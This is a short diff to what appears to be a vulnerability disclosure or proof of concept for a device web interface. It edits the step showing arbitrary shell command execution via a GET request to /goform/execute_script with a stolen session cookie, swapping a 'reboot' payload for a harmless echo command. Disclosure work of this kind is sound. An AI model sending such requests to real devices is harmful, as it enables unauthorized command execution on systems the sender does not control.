@@ -24,7 +24,7 @@ The response returns: Set-Cookie: ASPSSIONID=xyz...
 
 Step 2: Arbitrary Shell Command Execution
 Once the cookie is obtained, the following request triggers the execution
-GET /goform/execute_script?sys_list=reboot HTTP/1.1
+GET /goform/execute_script?sys_list=echo%20mrrp%20%3E%20meow.txt HTTP/1.1
 Host: [IP]
 Cookie: ASPSSIONID=[SESSION-ID]
 User-Agent: Security-Audit/1.0
